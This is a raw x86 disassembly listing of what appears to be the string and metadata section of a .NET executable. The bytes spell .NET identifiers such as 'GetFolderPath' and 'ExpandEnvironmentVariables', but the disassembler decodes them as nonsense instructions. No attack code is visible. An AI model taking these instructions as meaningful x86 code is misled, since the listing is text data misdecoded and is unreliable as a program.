  4084db:	inc    ebp
  4084dc:	outs   dx,BYTE PTR ds:[esi]
  4084dd:	jne    0x40854c
  4084df:	gs jb  0x408543
  4084e2:	je     0x408553
  4084e4:	jb     0x408514
  4084e6:	addr16 gs je 0x408549
  4084ea:	inc    ebx
  4084eb:	jne    0x40855f
  4084ed:	jb     0x408554
  4084ef:	outs   dx,BYTE PTR ds:[esi]
  4084f0:	je     0x4084f2
  4084f2:	cmp    al,0x3e
  4084f4:	xor    ebx,DWORD PTR [edi+0x5f]
  4084f7:	popa   
  4084f8:	jb     0x408561
  4084fa:	jae    0x408550
  4084fc:	jns    0x40856e
  4084fe:	add    BYTE PTR gs:[eax+esi*2],bh
  408502:	dec    ecx
  408503:	outs   dx,BYTE PTR ds:[esi]
  408504:	outs   dx,WORD PTR ds:[esi]
  408506:	ds xor eax,0x315f5f
  40850c:	cmp    al,0x3e
  40850e:	xor    al,0x5f
  408510:	pop    edi
  408511:	je     0x40857b
  408513:	imul   esi,DWORD PTR [ebx+0x0],0x5f6d3e3c
  40851a:	pop    edi
  40851b:	inc    esi
  40851c:	imul   ebp,DWORD PTR [esi+0x61],0x32796c6c
  408523:	add    BYTE PTR [esi+edi*1],bh
  408526:	aaa    
  408527:	pop    edi
  408528:	pop    edi
  408529:	ja     0x40859d
  40852b:	popa   
  40852c:	jo     0x408561
  40852e:	add    BYTE PTR [esi+edi*1],bh
  408531:	aaa    
  408532:	pop    edi
  408533:	pop    edi
  408534:	ja     0x4085a8
  408536:	popa   
  408537:	jo     0x40856d
  408539:	add    BYTE PTR [ebx+0x79],dl
  40853c:	jae    0x4085b2
  40853e:	gs ins DWORD PTR es:[edi],dx
  408540:	cs inc ebx
  408542:	outs   dx,DWORD PTR ds:[esi]
  408543:	ins    BYTE PTR es:[edi],dx
  408544:	ins    BYTE PTR es:[edi],dx
  408545:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40854a:	outs   dx,BYTE PTR ds:[esi]
  40854b:	jae    0x40857b
  40854d:	inc    edi
  40854e:	outs   dx,BYTE PTR gs:[esi]
  408550:	gs jb  0x4085bc
  408553:	arpl   WORD PTR [esi],bp
  408555:	dec    ecx
  408556:	inc    ebp
  408557:	outs   dx,BYTE PTR ds:[esi]
  408558:	jne    0x4085c7
  40855a:	gs jb  0x4085be
  40855d:	je     0x4085ce
  40855f:	jb     0x40859d
  408561:	push   ebx
  408562:	jns    0x4085d7
  408564:	je     0x4085cb
  408566:	ins    DWORD PTR es:[edi],dx
  408567:	cs push edx
  408569:	gs data16 ins BYTE PTR es:[edi],dx
  40856c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408571:	outs   dx,BYTE PTR ds:[esi]
  408572:	cs push eax
  408574:	jb     0x4085e5
  408576:	jo     0x4085dd
  408578:	jb     0x4085ee
  40857a:	jns    0x4085c5
  40857c:	outs   dx,BYTE PTR ds:[esi]
  40857d:	outs   dx,WORD PTR ds:[esi]
  40857f:	ds cs inc ebx
  408582:	jne    0x4085f6
  408584:	jb     0x4085eb
  408586:	outs   dx,BYTE PTR ds:[esi]
  408587:	je     0x408589
  408589:	push   ebx
  40858a:	jns    0x4085ff
  40858c:	je     0x4085f3
  40858e:	ins    DWORD PTR es:[edi],dx
  40858f:	cs inc ebx
  408591:	outs   dx,DWORD PTR ds:[esi]
  408592:	ins    BYTE PTR es:[edi],dx
  408593:	ins    BYTE PTR es:[edi],dx
  408594:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408599:	outs   dx,BYTE PTR ds:[esi]
  40859a:	jae    0x4085ca
  40859c:	dec    ecx
  40859d:	inc    ebp
  40859e:	outs   dx,BYTE PTR ds:[esi]
  40859f:	jne    0x40860e
  4085a1:	gs jb  0x408605
  4085a4:	je     0x408615
  4085a6:	jb     0x4085d6
  4085a8:	inc    ebx
  4085a9:	jne    0x40861d
  4085ab:	jb     0x408612
  4085ad:	outs   dx,BYTE PTR ds:[esi]
  4085ae:	je     0x4085b0
  4085b0:	inc    esp
  4085b1:	bound  esi,QWORD PTR gs:[ebp+0x67]
  4085b5:	addr16 gs jb 0x408601
  4085b9:	imul   esp,DWORD PTR [esp+eiz*2+0x65],0x7474416e
  4085c1:	jb     0x40862c
  4085c3:	bound  esi,QWORD PTR [ebp+0x74]
  4085c6:	add    BYTE PTR gs:[ebp+0x6e],al
  4085ca:	jbe    0x408635
  4085cc:	jb     0x40863d
  4085ce:	outs   dx,BYTE PTR ds:[esi]
  4085cf:	ins    DWORD PTR es:[edi],dx
  4085d0:	outs   dx,BYTE PTR gs:[esi]
  4085d2:	je     0x4085d4
  4085d4:	addr16 gs je 0x408637
  4085d8:	inc    ebx
  4085d9:	jne    0x40864d
  4085db:	jb     0x408642
  4085dd:	outs   dx,BYTE PTR ds:[esi]
  4085de:	je     0x40862d
  4085e0:	popa   
  4085e1:	outs   dx,BYTE PTR ds:[esi]
  4085e2:	popa   
  4085e3:	addr16 gs fs push esp
  4085e7:	push   0x64616572
  4085ec:	dec    ecx
  4085ed:	add    BYTE PTR fs:[edi+0x65],al
  4085f1:	je     0x408643
  4085f3:	jb     0x408664
  4085f5:	jo     0x40865c
  4085f7:	jb     0x40866d
  4085f9:	imul   esp,DWORD PTR [ebp+0x73],0x746f4e00
  408600:	push   ebx
  408601:	jne    0x408673
  408603:	jo     0x408674
  408605:	jb     0x40867b
  408607:	gs fs inc ebp
  40860a:	js     0x40866f
  40860c:	gs jo  0x408683
  40860f:	imul   ebp,DWORD PTR [edi+0x6e],0x6f4e3c00
  408616:	outs   dx,BYTE PTR ds:[esi]
  408617:	push   edi
  408618:	outs   dx,DWORD PTR ds:[esi]
  408619:	jb     0x408686
  40861b:	data16 ins BYTE PTR es:[edi],dx
  40861d:	outs   dx,DWORD PTR ds:[esi]
  40861e:	ja     0x40866d
  408620:	gs jae 0x408696
  408623:	popa   
  408624:	addr16 gs inc esi
  408627:	imul   esp,DWORD PTR [ebp+0x6c],0x643e7364
  40862e:	pop    edi
  40862f:	pop    edi
  408630:	aaa    
  408631:	add    BYTE PTR [ebx+0x79],dl
  408634:	jae    0x4086aa
  408636:	gs ins DWORD PTR es:[edi],dx
  408638:	cs inc ebx
  40863a:	outs   dx,DWORD PTR ds:[esi]
  40863b:	ins    BYTE PTR es:[edi],dx
  40863c:	ins    BYTE PTR es:[edi],dx
  40863d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408642:	outs   dx,BYTE PTR ds:[esi]
  408643:	jae    0x408673
  408645:	inc    edi
  408646:	outs   dx,BYTE PTR gs:[esi]
  408648:	gs jb  0x4086b4
  40864b:	arpl   WORD PTR [esi],bp
  40864d:	dec    ecx
  40864e:	inc    ebp
  40864f:	outs   dx,BYTE PTR ds:[esi]
  408650:	jne    0x4086bf
  408652:	gs jb  0x4086b6
  408655:	bound  ebp,QWORD PTR [ebp+eiz*2+0x3c]
  408659:	push   ebx
  40865a:	jns    0x4086cf
  40865c:	je     0x4086c3
  40865e:	ins    DWORD PTR es:[edi],dx
  40865f:	cs push edx
  408661:	gs data16 ins BYTE PTR es:[edi],dx
  408664:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408669:	outs   dx,BYTE PTR ds:[esi]
  40866a:	cs inc esi
  40866c:	imul   esp,DWORD PTR [ebp+0x6c],0x666e4964
  408673:	outs   dx,DWORD PTR ds:[esi]
  408674:	ds cs inc edi
  408677:	gs je  0x4086bf
  40867a:	outs   dx,BYTE PTR ds:[esi]
  40867b:	jne    0x4086ea
  40867d:	gs jb  0x4086e1
  408680:	je     0x4086f1
  408682:	jb     0x408684
  408684:	push   ebx
  408685:	jns    0x4086fa
  408687:	je     0x4086ee
  408689:	ins    DWORD PTR es:[edi],dx
  40868a:	cs inc ebx
  40868c:	outs   dx,DWORD PTR ds:[esi]
  40868d:	ins    BYTE PTR es:[edi],dx
  40868e:	ins    BYTE PTR es:[edi],dx
  40868f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408694:	outs   dx,BYTE PTR ds:[esi]
  408695:	jae    0x4086c5
  408697:	inc    edi
  408698:	outs   dx,BYTE PTR gs:[esi]
  40869a:	gs jb  0x408706
  40869d:	arpl   WORD PTR [esi],bp
  40869f:	dec    ecx
  4086a0:	inc    ebp
  4086a1:	outs   dx,BYTE PTR ds:[esi]
  4086a2:	jne    0x408711
  4086a4:	gs jb  0x408708
  4086a7:	je     0x408718
  4086a9:	jb     0x4086e7
  4086ab:	push   ebx
  4086ac:	jns    0x408721
  4086ae:	je     0x408715
  4086b0:	ins    DWORD PTR es:[edi],dx
  4086b1:	cs push edx
  4086b3:	gs data16 ins BYTE PTR es:[edi],dx
  4086b6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4086bb:	outs   dx,BYTE PTR ds:[esi]
  4086bc:	cs inc esi
  4086be:	imul   esp,DWORD PTR [ebp+0x6c],0x666e4964
  4086c5:	outs   dx,DWORD PTR ds:[esi]
  4086c6:	ds cs addr16 gs je 0x40872b
  4086cc:	inc    ebx
  4086cd:	jne    0x408741
  4086cf:	jb     0x408736
  4086d1:	outs   dx,BYTE PTR ds:[esi]
  4086d2:	je     0x4086d4
  4086d4:	cmp    al,0x66
  4086d6:	dec    ecx
  4086d7:	outs   dx,BYTE PTR ds:[esi]
  4086d8:	outs   dx,WORD PTR ds:[esi]
  4086da:	ds xor eax,0x385f5f
  4086e0:	cmp    al,0x3e
  4086e2:	ins    DWORD PTR es:[edi],dx
  4086e3:	pop    edi
  4086e4:	pop    edi
  4086e5:	inc    esi
  4086e6:	imul   ebp,DWORD PTR [esi+0x61],0x39796c6c
  4086ed:	add    BYTE PTR [esi+edi*1],bh
  4086f0:	aaa    
  4086f1:	pop    edi
  4086f2:	pop    edi
  4086f3:	ja     0x408767
  4086f5:	popa   
  4086f6:	jo     0x408759
  4086f8:	add    BYTE PTR [esi+edi*1],bh
  4086fb:	aaa    
  4086fc:	pop    edi
  4086fd:	pop    edi
  4086fe:	ja     0x408772
  408700:	popa   
  408701:	jo     0x408765
  408703:	add    BYTE PTR [ebx+0x79],dl
  408706:	jae    0x40877c
  408708:	gs ins DWORD PTR es:[edi],dx
  40870a:	cs inc ebx
  40870c:	outs   dx,DWORD PTR ds:[esi]
  40870d:	ins    BYTE PTR es:[edi],dx
  40870e:	ins    BYTE PTR es:[edi],dx
  40870f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408714:	outs   dx,BYTE PTR ds:[esi]
  408715:	jae    0x408745
  408717:	inc    edi
  408718:	outs   dx,BYTE PTR gs:[esi]
  40871a:	gs jb  0x408786
  40871d:	arpl   WORD PTR [esi],bp
  40871f:	dec    ecx
  408720:	inc    ebp
  408721:	outs   dx,BYTE PTR ds:[esi]
  408722:	jne    0x408791
  408724:	gs jb  0x408788
  408727:	je     0x408798
  408729:	jb     0x408767
  40872b:	push   ebx
  40872c:	jns    0x4087a1
  40872e:	je     0x408795
  408730:	ins    DWORD PTR es:[edi],dx
  408731:	cs push edx
  408733:	gs data16 ins BYTE PTR es:[edi],dx
  408736:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40873b:	outs   dx,BYTE PTR ds:[esi]
  40873c:	cs inc esi
  40873e:	imul   esp,DWORD PTR [ebp+0x6c],0x666e4964
  408745:	outs   dx,DWORD PTR ds:[esi]
  408746:	ds cs inc ebx
  408749:	jne    0x4087bd
  40874b:	jb     0x4087b2
  40874d:	outs   dx,BYTE PTR ds:[esi]
  40874e:	je     0x408750
  408750:	inc    edi
  408751:	gs je  0x40879a
  408754:	imul   esp,DWORD PTR [ebp+0x6c],0x54007364
  40875b:	outs   dx,DWORD PTR ds:[esi]
  40875c:	outs   dx,DWORD PTR ds:[esi]
  40875d:	ins    BYTE PTR es:[edi],dx
  40875e:	bound  ebp,QWORD PTR [edi+0x78]
  408761:	dec    ecx
  408762:	je     0x4087c9
  408764:	ins    DWORD PTR es:[edi],dx
  408765:	inc    ecx
  408766:	je     0x4087dc
  408768:	jb     0x4087d3
  40876a:	bound  esi,QWORD PTR [ebp+0x74]
  40876d:	add    BYTE PTR gs:[edi+0x72],dl
  408771:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  408779:	inc    ebx
  40877a:	outs   dx,DWORD PTR ds:[esi]
  40877b:	outs   dx,BYTE PTR ds:[esi]
  40877c:	arpl   WORD PTR [ecx+0x74],sp
  40877f:	add    BYTE PTR [ecx+ebp*2+0x72],al
  408783:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  408788:	jns    0x40878a
  40878a:	inc    ebp
  40878b:	js     0x4087f6
  40878d:	jae    0x408803
  40878f:	jae    0x408791
  408791:	push   ebx
  408792:	jns    0x408807
  408794:	je     0x4087fb
  408796:	ins    DWORD PTR es:[edi],dx
  408797:	cs inc ebx
  408799:	outs   dx,DWORD PTR ds:[esi]
  40879a:	fs gs inc esp
  40879d:	outs   dx,DWORD PTR ds:[esi]
  40879e:	ins    DWORD PTR es:[edi],dx
  40879f:	cs inc ebx
  4087a1:	outs   dx,DWORD PTR ds:[esi]
  4087a2:	ins    DWORD PTR es:[edi],dx
  4087a3:	jo     0x40880e
  4087a5:	ins    BYTE PTR es:[edi],dx
  4087a6:	gs jb  0x4087a9
  4087a9:	inc    ebx
  4087aa:	outs   dx,DWORD PTR ds:[esi]
  4087ab:	fs gs inc esp
  4087ae:	outs   dx,DWORD PTR ds:[esi]
  4087af:	ins    DWORD PTR es:[edi],dx
  4087b0:	push   eax
  4087b1:	jb     0x408822
  4087b3:	jbe    0x40881e
  4087b5:	fs gs jb 0x4087b9
  4087b9:	inc    ebx
  4087ba:	jb     0x408821
  4087bc:	popa   
  4087bd:	je     0x408824
  4087bf:	push   eax
  4087c0:	jb     0x408831
  4087c2:	jbe    0x40882d
  4087c4:	fs gs jb 0x4087c8
  4087c8:	push   eax
  4087c9:	popa   
  4087ca:	je     0x408834
  4087cc:	add    BYTE PTR [ebx+0x6f],al
  4087cf:	ins    DWORD PTR es:[edi],dx
  4087d0:	bound  ebp,QWORD PTR [ecx+0x6e]
  4087d3:	add    BYTE PTR gs:[edi+0x65],ah
  4087d7:	je     0x408838
  4087d9:	inc    esi
  4087da:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  4087e2:	jae    0x40884d
  4087e4:	outs   dx,DWORD PTR ds:[esi]
  4087e5:	outs   dx,BYTE PTR ds:[esi]
  4087e6:	add    BYTE PTR [ebx+0x74],dl
  4087e9:	jb     0x408850
  4087eb:	popa   
  4087ec:	ins    DWORD PTR es:[edi],dx
  4087ed:	push   edi
  4087ee:	jb     0x408859
  4087f0:	je     0x408857
  4087f2:	jb     0x4087f4
  4087f4:	inc    ebx
  4087f5:	outs   dx,DWORD PTR ds:[esi]
  4087f6:	fs gs inc edi
  4087f9:	outs   dx,BYTE PTR gs:[esi]
  4087fb:	gs jb  0x40885f
  4087fe:	je     0x40886f
  408800:	jb     0x408851
  408802:	jo     0x408878
  408804:	imul   ebp,DWORD PTR [edi+0x6e],0x65470073
  40880b:	outs   dx,BYTE PTR ds:[esi]
  40880c:	gs jb  0x408870
  40880f:	je     0x408876
  408811:	inc    ebx
  408812:	outs   dx,DWORD PTR ds:[esi]
  408813:	fs gs inc esi
  408816:	jb     0x408887
  408818:	ins    DWORD PTR es:[edi],dx
  408819:	inc    ebx
  40881a:	outs   dx,DWORD PTR ds:[esi]
  40881b:	ins    DWORD PTR es:[edi],dx
  40881c:	jo     0x408887
  40881e:	ins    BYTE PTR es:[edi],dx
  40881f:	gs push ebp
  408821:	outs   dx,BYTE PTR ds:[esi]
  408822:	imul   esi,DWORD PTR [eax+eax*1+0x43],0x69706d6f
  40882a:	ins    BYTE PTR es:[edi],dx
  40882b:	gs jb  0x408875
  40882e:	outs   dx,BYTE PTR gs:[esi]
  408830:	gs jb  0x408894
  408833:	je     0x40889a
  408835:	fs inc ecx
  408837:	je     0x4088ad
  408839:	jb     0x4088a4
  40883b:	bound  esi,QWORD PTR [ebp+0x74]
  40883e:	add    BYTE PTR gs:[edi+0x65],al
  408842:	je     0x408887
  408844:	jne    0x4088b8
  408846:	jb     0x4088ad
  408848:	outs   dx,BYTE PTR ds:[esi]
  408849:	je     0x40888f
  40884b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408852:	jns    0x408854
  408854:	dec    ecx
  408855:	jae    0x40889b
  408857:	imul   bp,WORD PTR gs:[esi+0x65],0x4c64
  40885e:	popa   
  40885f:	outs   dx,BYTE PTR ds:[esi]
  408860:	addr16 jne 0x4088c4
  408863:	add    BYTE PTR gs:[bx+di+0x73],cl
  408868:	dec    esi
  408869:	jne    0x4088d7
  40886b:	ins    BYTE PTR es:[edi],dx
  40886c:	dec    edi
  40886d:	jb     0x4088b4
  40886f:	ins    DWORD PTR es:[edi],dx
  408870:	jo     0x4088e6
  408872:	jns    0x408874
  408874:	inc    edi
  408875:	outs   dx,BYTE PTR gs:[esi]
  408877:	gs jb  0x4088db
  40887a:	je     0x4088e1
  40887c:	fs inc ebx
  40887e:	outs   dx,DWORD PTR ds:[esi]
  40887f:	fs gs inc ecx
  408882:	je     0x4088f8
  408884:	jb     0x4088ef
  408886:	bound  esi,QWORD PTR [ebp+0x74]
  408889:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40888e:	jne    0x4088f7
  408890:	addr16 gs jb 0x4088e2
  408894:	outs   dx,DWORD PTR ds:[esi]
  408895:	outs   dx,BYTE PTR ds:[esi]
  408896:	push   ebp
  408897:	jae    0x4088fe
  408899:	jb     0x4088de
  40889b:	outs   dx,DWORD PTR ds:[esi]
  40889c:	fs gs inc ecx
  40889f:	je     0x408915
  4088a1:	jb     0x40890c
  4088a3:	bound  esi,QWORD PTR [ebp+0x74]
  4088a6:	add    BYTE PTR gs:[edx+0x65],dl
  4088aa:	data16 gs jb 0x408913
  4088ae:	outs   dx,BYTE PTR ds:[esi]
  4088af:	arpl   WORD PTR [ebp+0x45],sp
  4088b2:	jno    0x408929
  4088b4:	popa   
  4088b5:	ins    BYTE PTR es:[edi],dx
  4088b6:	jae    0x4088b8
  4088b8:	inc    ecx
  4088b9:	jae    0x40892e
  4088bb:	gs ins DWORD PTR es:[edi],dx
  4088bd:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4088c1:	addr16 gs je 0x408924
  4088c5:	inc    ecx
  4088c6:	jae    0x40893b
  4088c8:	gs ins DWORD PTR es:[edi],dx
  4088ca:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  4088ce:	inc    edi
  4088cf:	gs je  0x408925
  4088d2:	je     0x408946
  4088d4:	imul   ebp,DWORD PTR [esi+0x67],0x69644500
  4088db:	je     0x40894c
  4088dd:	jb     0x408921
  4088df:	jb     0x408950
  4088e1:	ja     0x408956
  4088e3:	popa   
  4088e4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4088e8:	je     0x40895e
  4088ea:	jb     0x408955
  4088ec:	bound  esi,QWORD PTR [ebp+0x74]
  4088ef:	add    BYTE PTR gs:[ebp+0x64],al
  4088f3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4088fb:	jae    0x40895e
  4088fd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  408901:	je     0x408964
  408903:	je     0x40896a
  408905:	add    BYTE PTR [ebp+0x6d],al
  408908:	jo     0x40897e
  40890a:	jns    0x40890c
  40890c:	dec    esp
  40890d:	outs   dx,DWORD PTR ds:[esi]
  40890e:	popa   
  40890f:	fs inc esi
  408911:	jb     0x408982
  408913:	ins    DWORD PTR es:[edi],dx
  408914:	add    BYTE PTR [edi+0x65],al
  408917:	je     0x40896d
  408919:	jns    0x40898b
  40891b:	gs jae 0x40891e
  40891e:	addr16 gs je 0x408981
  408922:	dec    ecx
  408923:	jae    0x40896e
  408925:	outs   dx,BYTE PTR ds:[esi]
  408926:	je     0x40898d
  408928:	jb     0x408990
  40892a:	popa   
  40892b:	arpl   WORD PTR [ebp+0x0],sp
  40892e:	inc    ebp
  40892f:	js     0x4089a5
  408931:	gs jb  0x4089a2
  408934:	popa   
  408935:	ins    BYTE PTR es:[edi],dx
  408936:	inc    esp
  408937:	popa   
  408938:	je     0x40899b
  40893a:	inc    ebp
  40893b:	js     0x4089a0
  40893d:	push   0x65676e61
  408942:	inc    ecx
  408943:	je     0x4089b9
  408945:	jb     0x4089b0
  408947:	bound  esi,QWORD PTR [ebp+0x74]
  40894a:	add    BYTE PTR gs:[edi+0x65],al
  40894e:	je     0x408993
  408950:	jne    0x4089c5
  408952:	je     0x4089c3
  408954:	ins    DWORD PTR es:[edi],dx
  408955:	inc    ecx
  408956:	je     0x4089cc
  408958:	jb     0x4089c3
  40895a:	bound  esi,QWORD PTR [ebp+0x74]
  40895d:	gs jae 0x408960
  408960:	inc    ebx
  408961:	outs   dx,DWORD PTR ds:[esi]
  408962:	outs   dx,BYTE PTR ds:[esi]
  408963:	jae    0x4089d4
  408965:	ins    BYTE PTR es:[edi],dx
  408966:	add    BYTE PTR gs:[edi+0x65],ah
  40896a:	je     0x4089cb
  40896c:	dec    edi
  40896d:	jne    0x4089e3
  40896f:	add    BYTE PTR [ebp+0x78],al
  408972:	arpl   WORD PTR [ebp+0x70],sp
  408975:	je     0x4089e0
  408977:	outs   dx,DWORD PTR ds:[esi]
  408978:	outs   dx,BYTE PTR ds:[esi]
  408979:	add    BYTE PTR [ecx+0x73],al
  40897c:	jae    0x4089e3
  40897e:	ins    DWORD PTR es:[edi],dx
  40897f:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  408983:	popa   
  408984:	ins    DWORD PTR es:[edi],dx
  408985:	add    BYTE PTR gs:[edi+0x65],al
  408989:	je     0x4089d9
  40898b:	popa   
  40898c:	ins    DWORD PTR es:[edi],dx
  40898d:	add    BYTE PTR gs:[esi+0x65],dl
  408991:	jb     0x408a06
  408993:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40899a:	pop    edi
  40899b:	push   esi
  40899c:	gs jb  0x408a12
  40899f:	imul   ebp,DWORD PTR [edi+0x6e],0x536f5400
  4089a6:	je     0x408a1a
  4089a8:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  4089af:	je     0x408a16
  4089b1:	ins    DWORD PTR es:[edi],dx
  4089b2:	cs push esp
  4089b4:	gs js  0x408a2b
  4089b7:	add    BYTE PTR [ebx+0x74],dl
  4089ba:	jb     0x408a25
  4089bc:	outs   dx,BYTE PTR ds:[esi]
  4089bd:	addr16 inc edx
  4089bf:	jne    0x408a2a
  4089c1:	ins    BYTE PTR es:[edi],dx
  4089c2:	fs gs jb 0x4089c6
  4089c6:	inc    ecx
  4089c7:	jo     0x408a39
  4089c9:	outs   dx,BYTE PTR gs:[esi]
  4089cb:	fs dec esp
  4089cd:	imul   ebp,DWORD PTR [esi+0x65],0x74656700
  4089d4:	pop    edi
  4089d5:	inc    ebx
  4089d6:	jne    0x408a4a
  4089d8:	jb     0x408a3f
  4089da:	outs   dx,BYTE PTR ds:[esi]
  4089db:	je     0x408a20
  4089dd:	jne    0x408a4b
  4089df:	je     0x408a56
  4089e1:	jb     0x408a48
  4089e3:	add    BYTE PTR [edx+esi*2+0x69],dl
  4089e7:	ins    DWORD PTR es:[edi],dx
  4089e8:	add    BYTE PTR [edi+ebp*2+0x4c],dl
  4089ec:	outs   dx,DWORD PTR ds:[esi]
  4089ed:	ja     0x408a54
  4089ef:	jb     0x4089f1
  4089f1:	push   ebx
  4089f2:	je     0x408a55
  4089f4:	jb     0x408a6a
  4089f6:	jae    0x408a4f
  4089f8:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x5f746567
  408a00:	dec    esp
  408a01:	outs   dx,BYTE PTR gs:[esi]
  408a03:	addr16 je 0x408a6e
  408a06:	add    BYTE PTR [ebx+0x75],dl
  408a09:	bound  esi,QWORD PTR [ebx+0x74]
  408a0c:	jb     0x408a77
  408a0e:	outs   dx,BYTE PTR ds:[esi]
  408a0f:	add    BYTE PTR [di+0x6e],al
  408a13:	fs jae 0x408a6d
  408a16:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x656c6946
  408a1e:	add    BYTE PTR [ecx+0x6e],cl
  408a21:	fs gs js 0x408a74
  408a25:	data16 add BYTE PTR [ebp+0x69],cl
  408a29:	arpl   WORD PTR [edx+0x6f],si
  408a2c:	jae    0x408a9d
  408a2e:	data16 je 0x408a5f
  408a31:	push   edi
  408a32:	outs   dx,DWORD PTR ds:[esi]
  408a33:	jb     0x408aa0
  408a35:	data16 ins BYTE PTR es:[edi],dx
  408a37:	outs   dx,DWORD PTR ds:[esi]
  408a38:	ja     0x408a68
  408a3a:	push   esp
  408a3b:	outs   dx,DWORD PTR ds:[esi]
  408a3c:	outs   dx,DWORD PTR ds:[esi]
  408a3d:	ins    BYTE PTR es:[edi],dx
  408a3e:	jae    0x408a6e
  408a40:	inc    ebp
  408a41:	jb     0x408ab5
  408a43:	outs   dx,DWORD PTR ds:[esi]
  408a44:	jb     0x408a99
  408a46:	je     0x408aba
  408a48:	imul   ebp,DWORD PTR [esi+0x67],0x65722e73
  408a4f:	jae    0x408ac0
  408a51:	jne    0x408ac5
  408a53:	arpl   WORD PTR [ebp+0x73],sp
  408a56:	add    BYTE PTR [eax],al
  408a58:	add    BYTE PTR ds:0x720050,dh
  408a5e:	outs   dx,DWORD PTR ds:[esi]
  408a5f:	add    BYTE PTR [ebx+0x0],ah
  408a62:	add    BYTE PTR gs:[ebx+0x0],dh
  408a66:	jae    0x408a68
  408a68:	imul   eax,DWORD PTR [eax],0x67006e
  408a6e:	and    BYTE PTR [eax],al
  408a70:	imul   eax,DWORD PTR [eax],0x74006e
  408a76:	add    BYTE PTR gs:[edx+0x0],dh
  408a7a:	data16 add BYTE PTR [ecx+0x0],ah
  408a7e:	arpl   WORD PTR [eax],ax
  408a80:	add    BYTE PTR gs:[eax],ah
  408a83:	add    BYTE PTR [edi],ah
  408a85:	add    BYTE PTR [ebx+0x0],bh
  408a88:	xor    BYTE PTR [eax],al
  408a8a:	jge    0x408a8c
  408a8c:	daa    
  408a8d:	add    BYTE PTR [ecx],al
  408a8f:	inc    edi
  408a90:	and    BYTE PTR [eax],al
  408a92:	and    BYTE PTR [eax],al
  408a94:	inc    edi
  408a95:	add    BYTE PTR [ebp+0x0],ah
  408a98:	outs   dx,BYTE PTR ds:[esi]
  408a99:	add    BYTE PTR [ebp+0x0],ah
  408a9c:	jb     0x408a9e
  408a9e:	popa   
  408a9f:	add    BYTE PTR [eax+eax*1+0x69],dh
  408aa3:	add    BYTE PTR [esi+0x0],ch
  408aa6:	add    BYTE PTR [bx+si],ah
  408aa9:	add    BYTE PTR [ecx+0x0],cl
  408aac:	outs   dx,BYTE PTR ds:[esi]
  408aad:	add    BYTE PTR [esi+0x0],dh
  408ab0:	outs   dx,DWORD PTR ds:[esi]
  408ab1:	add    BYTE PTR [ebx+0x0],ch
  408ab4:	add    BYTE PTR gs:[ebp+0x0],cl
  408ab8:	add    BYTE PTR gs:[eax+eax*1+0x68],dh
  408abd:	add    BYTE PTR [edi+0x0],ch
  408ac0:	add    BYTE PTR fs:[eax],ah
  408ac3:	add    BYTE PTR [esi+0x0],ah
  408ac6:	outs   dx,DWORD PTR ds:[esi]
  408ac7:	add    BYTE PTR [edx+0x0],dh
  408aca:	and    BYTE PTR [eax],al
  408acc:	daa    
  408acd:	add    BYTE PTR [ebx+0x0],bh
  408ad0:	xor    BYTE PTR [eax],al
  408ad2:	jge    0x408ad4
  408ad4:	daa    
  408ad5:	add    BYTE PTR [ecx],al
  408ad7:	pop    edi
  408ad8:	jnp    0x408ada
  408ada:	xor    BYTE PTR [eax],al
  408adc:	jge    0x408ade
  408ade:	and    BYTE PTR [eax],al
  408ae0:	ja     0x408ae2
  408ae2:	popa   
  408ae3:	add    BYTE PTR [ebx+0x0],dh
  408ae6:	and    BYTE PTR [eax],al
  408ae8:	outs   dx,BYTE PTR ds:[esi]
  408ae9:	add    BYTE PTR [edi+0x0],ch
  408aec:	je     0x408aee
  408aee:	and    BYTE PTR [eax],al
  408af0:	popa   
  408af1:	add    BYTE PTR [eax],ah
  408af3:	add    BYTE PTR [esi+0x0],dh
  408af6:	popa   
  408af7:	add    BYTE PTR [eax+eax*1+0x69],ch
  408afb:	add    BYTE PTR [eax+eax*1+0x20],ah
  408aff:	add    BYTE PTR [ebp+0x0],ah
  408b02:	jbe    0x408b04
  408b04:	add    BYTE PTR gs:[esi+0x0],ch
  408b08:	je     0x408b0a
  408b0a:	add    BYTE PTR cs:[eax],ah
  408b0d:	add    BYTE PTR [eax],ah
  408b0f:	add    BYTE PTR [ecx+0x0],cl
  408b12:	je     0x408b14
  408b14:	and    BYTE PTR [eax],al
  408b16:	ja     0x408b18
  408b18:	imul   eax,DWORD PTR [eax],0x6c006c
  408b1e:	and    BYTE PTR [eax],al
  408b20:	bound  eax,QWORD PTR [eax]
  408b22:	add    BYTE PTR gs:[eax],ah
  408b25:	add    BYTE PTR [ebx+0x0],dh
  408b28:	imul   eax,DWORD PTR [eax],0x69
  408b2b:	add    BYTE PTR [eax+0x0],dh
  408b2e:	jo     0x408b30
  408b30:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  408b35:	add    BYTE PTR [eax],al
  408b37:	inc    ecx
  408b38:	and    BYTE PTR [eax],al
  408b3a:	and    BYTE PTR [eax],al
  408b3c:	inc    edi
  408b3d:	add    BYTE PTR [ebp+0x0],ah
  408b40:	outs   dx,BYTE PTR ds:[esi]
  408b41:	add    BYTE PTR [ebp+0x0],ah
  408b44:	jb     0x408b46
  408b46:	popa   
  408b47:	add    BYTE PTR [eax+eax*1+0x69],dh
